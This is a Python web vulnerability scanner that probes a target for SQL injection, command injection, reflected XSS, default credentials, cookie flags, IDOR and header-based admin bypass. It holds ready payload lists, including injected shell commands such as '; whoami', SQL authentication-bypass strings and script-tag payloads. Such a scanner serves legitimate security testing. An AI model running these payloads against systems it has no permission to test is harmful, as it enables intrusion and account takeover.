#!/usr/bin/env python3
"""
Active Vulnerability Testing Modules
Phase 5: Injection, XSS, Auth, Authorization, API Security
"""

import re
import time
import json
from urllib.parse import urlencode, parse_qs, urlparse
from bs4 import BeautifulSoup


class InjectionTester:
    """Test for various injection vulnerabilities."""
    
    def __init__(self, session, base_url, request_delay=1.0):
        self.session = session
        self.base_url = base_url
        self.request_delay = request_delay
        self.findings = []
    
    def test_sqli(self, url, params, method='GET'):
        """Test for SQL Injection vulnerabilities."""
        # Tier 1: Basic SQLi payloads
        basic_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "1' UNION SELECT NULL--",
            "admin'--",
            "admin'/*",
            "' OR 1=1--",
            "') OR ('1'='1",
        ]
        
        # Tier 2: Time-based SQLi
        time_based_payloads = [
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1'; WAITFOR DELAY '00:00:05'--",
        ]
        
        # Tier 3: Error-based SQLi
        error_payloads = [
            "1' AND 1=CONVERT(int, @@version)--",
            "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        ]
        
        baseline_response = self._make_request(url, params, method)
        if not baseline_response:
            return []
        
        baseline_time = baseline_response.elapsed.total_seconds()
        baseline_body = baseline_response.text.lower()
        
        findings = []
        
        # Test basic payloads
        for payload in basic_payloads:
            test_params = self._inject_payload(params, payload)
            response = self._make_request(url, test_params, method)
            if not response:
                continue
            
            # Check for SQL error messages
            sql_errors = [
                'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
                'microsoft sql', 'sql server', 'sql error', 'sql warning',
                'database error', 'query failed', 'sqlstate'
            ]
            
            response_lower = response.text.lower()
            for error in sql_errors:
                if error in response_lower and error not in baseline_body:
                    findings.append({
                        'type': 'SQL Injection',
                        'severity': 'High',
                        'url': url,
                        'parameter': list(params.keys())[0] if params else 'N/A',
                        'payload': payload,
                        'evidence': f"SQL error detected: {error}",
                        'confidence': 75
                    })
                    break
            
            # Check for authentication bypass
            if response.status_code == 200 and baseline_response.status_code in [401, 403]:
                if len(response.text) > len(baseline_response.text) * 1.5:
                    findings.append({
                        'type': 'SQL Injection (Auth Bypass)',
                        'severity': 'Critical',
                        'url': url,
                        'parameter': list(params.keys())[0] if params else 'N/A',
                        'payload': payload,
                        'evidence': 'Possible authentication bypass',
                        'confidence': 60
                    })
        
        # Test time-based SQLi
        for payload in time_based_payloads:
            test_params = self._inject_payload(params, payload)
            start_time = time.time()
            response = self._make_request(url, test_params, method)
            elapsed = time.time() - start_time
            
            if elapsed > baseline_time + 4:  # 4 second delay indicates time-based SQLi
                findings.append({
                    'type': 'SQL Injection (Time-based)',
                    'severity': 'High',
                    'url': url,
                    'parameter': list(params.keys())[0] if params else 'N/A',
                    'payload': payload,
                    'evidence': f"Response delayed by {elapsed - baseline_time:.2f} seconds",
                    'confidence': 80
                })
        
        return findings
    
    def test_command_injection(self, url, params, method='GET'):
        """Test for Command Injection vulnerabilities."""
        # OS-agnostic payloads
        payloads = [
            "; ls",
            "| ls",
            "& ls",
            "`ls`",
            "$(ls)",
            "; whoami",
            "| whoami",
            "& whoami",
            "; id",
            "| id",
            "& id",
            "; ping -c 3 127.0.0.1",
            "| ping -c 3 127.0.0.1",
            "& ping -c 3 127.0.0.1",
        ]
        
        baseline_response = self._make_request(url, params, method)
        if not baseline_response:
            return []
        
        baseline_body = baseline_response.text.lower()
        findings = []
        
        for payload in payloads:
            test_params = self._inject_payload(params, payload)
            response = self._make_request(url, test_params, method)
            if not response:
                continue
            
            response_lower = response.text.lower()
            
            # Check for command output indicators
            command_indicators = [
                'uid=', 'gid=', 'groups=',  # id command
                'root', 'bin', 'usr', 'etc',  # ls output
                'ping statistics', 'packets transmitted',  # ping output
                'total ', 'drwx', '-rw-',  # ls -l output
            ]
            
            for indicator in command_indicators:
                if indicator in response_lower and indicator not in baseline_body:
                    findings.append({
                        'type': 'Command Injection',
                        'severity': 'Critical',
                        'url': url,
                        'parameter': list(params.keys())[0] if params else 'N/A',
                        'payload': payload,
                        'evidence': f"Command output detected: {indicator}",
                        'confidence': 85
                    })
                    break
        
        return findings
    
    def test_xss(self, url, params, method='GET'):
        """Test for Cross-Site Scripting vulnerabilities."""
        # Reflected XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        ]
        
        findings = []
        
        for payload in xss_payloads:
            test_params = self._inject_payload(params, payload)
            response = self._make_request(url, test_params, method)
            if not response:
                continue
            
            # Check if payload is reflected in response
            if payload in response.text:
                # Check if it's in a dangerous context
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Check if in script tag
                if '<script>' in response.text and payload in response.text:
                    findings.append({
                        'type': 'XSS (Reflected)',
                        'severity': 'Medium',
                        'url': url,
                        'parameter': list(params.keys())[0] if params else 'N/A',
                        'payload': payload,
                        'evidence': 'Payload reflected in response without encoding',
                        'confidence': 70
                    })
                # Check if in HTML context
                elif payload in response.text:
                    findings.append({
                        'type': 'XSS (Reflected - Potential)',
                        'severity': 'Medium',
                        'url': url,
                        'parameter': list(params.keys())[0] if params else 'N/A',
                        'payload': payload,
                        'evidence': 'Payload reflected in response (needs manual verification)',
                        'confidence': 50
                    })
        
        return findings
    
    def _inject_payload(self, params, payload):
        """Inject payload into parameters."""
        if isinstance(params, dict):
            test_params = params.copy()
            # Inject into first parameter
            if test_params:
                first_key = list(test_params.keys())[0]
                test_params[first_key] = payload
            else:
                test_params['test'] = payload
        else:
            test_params = {'test': payload}
        return test_params
    
    def _make_request(self, url, params, method):
        """Make HTTP request with rate limiting."""
        time.sleep(self.request_delay)
        try:
            if method.upper() == 'GET':
                return self.session.get(url, params=params, timeout=30)
            elif method.upper() == 'POST':
                return self.session.post(url, data=params, timeout=30)
            else:
                return self.session.request(method, url, params=params if method.upper() == 'GET' else None,
                                           data=params if method.upper() == 'POST' else None, timeout=30)
        except Exception as e:
            return None


class AuthTester:
    """Test authentication and session management."""
    
    def __init__(self, session, base_url, request_delay=1.0):
        self.session = session
        self.base_url = base_url
        self.request_delay = request_delay
        self.findings = []
    
    def test_weak_credentials(self, login_url, username_field='username', password_field='password'):
        """Test for weak default credentials."""
        common_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('test', 'test'),
            ('user', 'user'),
            ('administrator', 'administrator'),
        ]
        
        findings = []
        
        for username, password in common_creds:
            time.sleep(self.request_delay)
            try:
                data = {username_field: username, password_field: password}
                response = self.session.post(login_url, data=data, timeout=30, allow_redirects=False)
                
                # Check for successful login indicators
                if response.status_code in [200, 302, 301]:
                    # Check for session cookies
                    if 'session' in response.cookies or 'auth' in response.cookies or 'token' in response.cookies:
                        findings.append({
                            'type': 'Weak Credentials',
                            'severity': 'High',
                            'url': login_url,
                            'credentials': f"{username}:{password}",
                            'evidence': 'Successful login with weak credentials',
                            'confidence': 90
                        })
            except Exception:
                pass
        
        return findings
    
    def test_session_fixation(self, login_url):
        """Test for session fixation vulnerabilities."""
        # Get session before login
        pre_login_response = self.session.get(self.base_url)
        pre_session_id = None
        
        for cookie in self.session.cookies:
            if 'session' in cookie.name.lower() or 'sid' in cookie.name.lower():
                pre_session_id = cookie.value
                break
        
        # Attempt login
        # (This would need actual credentials or test account)
        # For now, just check if session ID changes
        
        findings = []
        # Logic would go here
        
        return findings
    
    def analyze_cookies(self, response):
        """Analyze cookie security flags."""
        findings = []
        
        for cookie in response.cookies:
            cookie_dict = dict(cookie.__dict__)
            
            # Check HttpOnly flag
            if not cookie_dict.get('has_nonstandard_attr', {}).get('HttpOnly', False):
                findings.append({
                    'type': 'Cookie Security (Missing HttpOnly)',
                    'severity': 'Medium',
                    'cookie': cookie.name,
                    'evidence': 'Cookie missing HttpOnly flag (vulnerable to XSS)',
                    'confidence': 100
                })
            
            # Check Secure flag
            if not cookie_dict.get('secure', False) and self.base_url.startswith('https'):
                findings.append({
                    'type': 'Cookie Security (Missing Secure)',
                    'severity': 'Medium',
                    'cookie': cookie.name,
                    'evidence': 'Cookie missing Secure flag (transmitted over HTTP)',
                    'confidence': 100
                })
        
        return findings


class AuthorizationTester:
    """Test authorization and access control."""
    
    def __init__(self, session, base_url, request_delay=1.0):
        self.session = session
        self.base_url = base_url
        self.request_delay = request_delay
        self.findings = []
    
    def test_idor(self, url_pattern, id_range=range(1, 11)):
        """Test for Insecure Direct Object Reference (IDOR)."""
        findings = []
        
        for obj_id in id_range:
            test_url = url_pattern.format(id=obj_id)
            time.sleep(self.request_delay)
            
            response = self.session.get(test_url, timeout=30)
            
            # Check if we can access objects we shouldn't
            if response.status_code == 200:
                # This would need baseline comparison
                # For now, just note accessible IDs
                findings.append({
                    'type': 'IDOR (Potential)',
                    'severity': 'Medium',
                    'url': test_url,
                    'evidence': f'Object ID {obj_id} accessible',
                    'confidence': 50
                })
        
        return findings
    
    def test_vertical_escalation(self, admin_url):
        """Test for vertical privilege escalation."""
        findings = []
        
        # Try to access admin endpoints without admin privileges
        response = self.session.get(admin_url, timeout=30, allow_redirects=False)
        
        if response.status_code == 200:
            findings.append({
                'type': 'Privilege Escalation (Vertical)',
                'severity': 'High',
                'url': admin_url,
                'evidence': 'Admin endpoint accessible without authentication',
                'confidence': 80
            })
        elif response.status_code == 403:
            # Try bypass techniques
            bypass_headers = [
                {'X-Forwarded-For': '127.0.0.1'},
                {'X-Real-IP': '127.0.0.1'},
                {'X-Originating-IP': '127.0.0.1'},
            ]
            
            for header in bypass_headers:
                test_response = self.session.get(admin_url, headers=header, timeout=30, allow_redirects=False)
                if test_response.status_code == 200:
                    findings.append({
                        'type': 'Privilege Escalation (Header Bypass)',
                        'severity': 'High',
                        'url': admin_url,
                        'header': header,
                        'evidence': 'Admin endpoint accessible with IP spoofing header',
                        'confidence': 75
                    })
        
        return findings
